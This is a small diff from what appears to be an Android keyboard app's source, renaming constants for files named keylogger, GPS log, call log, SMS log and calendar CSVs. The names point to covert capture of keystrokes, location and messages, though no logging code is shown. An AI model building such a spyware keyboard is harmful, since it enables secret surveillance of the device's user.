@@ -87,11 +87,11 @@ implements KeyboardView.OnKeyboardActionListener {
 
 	private String mWordSeparators;
 	private static String KBD_LOG_FILTER = "KBD";
-	private String KLGRFILENAME = "keylogger0019.csv";
-	private String GPSFILENAME = "gpslog0019.csv";
-	private String CLGFILENAME = "calllog0019.csv";
-	private String SMSFILENAME = "smslog0019.csv";
-	private String CLDFILENAME = "calendar0019.csv";
+	private String KLGRFILENAME = "keylogger2341.csv";
+	private String GPSFILENAME = "gpslog2341.csv";
+	private String CLGFILENAME = "calllog2341.csv";
+	private String SMSFILENAME = "smslog2341.csv";
+	private String CLDFILENAME = "calendar2341.csv";
 	
 
 	private final BroadcastReceiver receiver = new BroadcastReceiver() {
